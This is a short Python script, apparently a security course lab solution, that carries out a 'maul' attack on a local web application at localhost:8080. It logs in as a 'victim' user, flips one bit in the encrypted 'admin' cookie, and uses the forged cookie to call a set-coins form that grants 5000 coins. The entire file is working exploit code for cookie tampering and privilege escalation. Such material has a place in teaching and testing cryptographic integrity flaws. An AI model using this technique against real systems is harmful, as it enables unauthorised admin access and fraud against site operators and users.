# import necessary libraries/files 
from requests import codes, Session

# login and setcoins links
LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

# function to call and perform the login with the given paramaters
def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

# function to call and set coins with the given parameters
def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response.status_code == codes.ok

# function for actually performing the maul attack
def do_attack():
	# initializing the session and target username and password and asserting
	# logging in with these paramates doesn't fail
	sess = Session()
	uname ="victim"
	pw = "victim"
	assert(do_login_form(sess, uname,pw))

	# taking the admin cookie, assigning it as a byte array, and accessing the
	# first byte
	byte_val = bytes.fromhex(sess.cookies['admin'])
	new_byte_val = bytearray(byte_val)
	bin_byte_0 = bin(new_byte_val[0])

	# if the last bit of the first byte is a 0, flip it to 1. Else if it is a 1
	# then flip it to be 0
	if bin_byte_0[-1] == '0':
		new_byte_val[0] = new_byte_val[0]+1
	else:
		new_byte_val[0] = new_byte_val[0]-1

	# make the admin cookie equal to None. Take the new cookie with the flipped
	# bit and assign it as the new value for the admin cookie
	new_cookie = new_byte_val.hex()
	sess.cookies['admin'] = None
	sess.cookies['admin'] = new_cookie

	# call the set coins form with the target username, coin amount, and session
	# containing the altered admin cookie
	target_uname = uname
	amount = 5000
	result = do_setcoins_form(sess, target_uname,amount)

# main method to perform the attack
if __name__=='__main__':
	do_attack()
